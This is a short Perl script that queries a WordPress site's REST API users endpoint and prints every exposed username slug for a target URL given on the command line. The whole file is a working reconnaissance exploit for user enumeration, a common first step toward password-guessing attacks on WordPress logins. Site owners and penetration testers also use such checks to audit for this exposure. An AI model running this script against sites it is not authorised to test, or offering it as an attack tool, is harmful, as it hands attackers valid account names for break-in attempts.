#!/usr/bin/env perl

# Use: perl wp_username_exposed.pl https://target.com

use JSON;
use 5.018;
use strict;
use warnings;
use Try::Tiny;
use LWP::UserAgent;

sub main {
    my $target = $ARGV[0];

    if ($target) {
        my $target = $target . "/wp-json/wp/v2/users";

        my $userAgent = LWP::UserAgent -> new();
	    my $request   = $userAgent -> get($target);
	    my $httpCode  = $request -> code();

        try {
            my $content = decode_json ($request -> content);
            
            foreach my $data (@$content) {
                my $username = $data -> {'slug'};
                print "[+] - Username -> $username\n";
            }
        }
        
        catch {
            warn "[-] - Warning: it was not possible to extract users from this URL.\n";
        };
    }   
}

main();
exit;